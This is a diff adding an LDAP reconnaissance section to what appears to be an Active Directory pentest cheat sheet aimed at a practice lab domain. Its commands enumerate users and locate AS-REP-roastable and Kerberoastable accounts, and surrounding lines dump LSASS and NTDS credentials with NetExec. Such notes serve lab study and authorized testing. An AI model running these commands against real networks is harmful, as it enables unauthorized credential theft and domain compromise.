@@ -18,6 +18,22 @@ nxc smb 192.168.56.11 -u USER -p PASS -M lsassy
 nxc smb 192.168.56.11 -u USER -p PASS --ntds
 ```
 
+## ldapsearch (recon — best on slow/VPN links, beats RID-brute)
+
+```bash
+# NC discovery, then bulk pulls (anonymous or guest empty password)
+ldapsearch -x -H ldap://192.168.56.11 -s base namingContexts
+ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
+  '(objectClass=user)' sAMAccountName description info userPrincipalName
+# AS-REP roastable / Kerberoastable in one query each
+ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
+  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
+ldapsearch -x -H ldap://192.168.56.11 -b 'DC=north,DC=sevenkingdoms,DC=local' \
+  '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
+# clock / Kerberos skew check (rootDSE)
+ldapsearch -x -H ldap://192.168.56.11 -s base '' currentTime
+```
+
 ## Impacket
 
 ```bash
